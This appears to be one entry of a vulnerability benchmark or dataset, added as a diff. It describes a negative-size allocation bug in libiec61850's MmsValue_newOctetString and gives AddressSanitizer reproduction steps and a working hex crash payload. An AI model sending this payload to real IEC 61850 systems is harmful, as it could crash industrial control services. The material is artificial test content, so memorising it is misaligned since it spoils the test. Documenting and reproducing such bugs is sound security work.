@@ -1,0 +1,14 @@
+Number: 193
+
+Summarize:
+The report does not specify a version. In libiec61850, `MmsValue_newOctetString` (`SRC/src/mms/iso_mms/common/mms_value.c`) is reported to accept a negative `maxSize` without validation; that negative value is then used for allocation, producing a huge size request (for example, `-1` becoming `0xffffffff` on 32-bit or `0xffffffffffffffff` on 64-bit). With the supplied PoC input, `MmsValue_decodeMmsData` reaches `MmsValue_newOctetString`, and AddressSanitizer reports an oversized `calloc` request in `Memory_calloc` and aborts with `allocation-size-too-big`.
+
+Reproduce:
+1. Build libiec61850 with AddressSanitizer enabled using `CFLAGS=-fsanitize=address -g` and `CXXFLAGS=-fsanitize=address -g`.
+2. Compile the provided `test.c` from `poc.zip`.
+3. Create the PoC input file `poc` with the supplied data: `8989 f189 8989 ff9d ffff 8994 8b96 df40 893f 8989 af89`.
+4. Run the program in gdb with stdin redirected from the PoC: `./test < poc`.
+5. Expected result: AddressSanitizer aborts with `ERROR: AddressSanitizer: requested allocation size 0xffffffffffffff94 ... exceeds maximum supported size`, and the stack trace includes `Memory_calloc`, `MmsValue_newOctetString`, `MmsValue_decodeMmsData`, and `main`.
+
+Payload:
+89 89 f1 89 89 89 ff 9d ff ff 89 94 8b 96 df 40 89 3f 89 89 af 89
